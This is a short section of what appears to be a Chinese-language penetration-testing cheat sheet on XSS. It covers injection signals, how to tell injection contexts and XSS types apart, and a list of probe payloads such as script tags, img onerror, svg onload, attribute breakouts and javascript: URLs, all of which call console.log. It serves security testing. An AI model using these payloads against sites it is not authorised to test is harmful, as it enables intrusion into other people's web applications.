# §5 XSS
### 识别信号
- 用户输入回显到页面（评论/搜索/资料/URL参数）
### 决策流程
```
输入<>'"识别上下文 → HTML标签间/属性中/JS代码中/URL中
反射型=请求即执行 存储型=持久执行  DOM型=JS从URL取值写入
```
### Payload
```
<script>console.log('xss')</script>
<img src=x onerror=console.log('xss')>
<svg onload=console.log('xss')>
" onmouseover=console.log('xss') "   ' onclick=console.log('xss') '
';console.log('xss')//    javascript:console.log('xss')
```
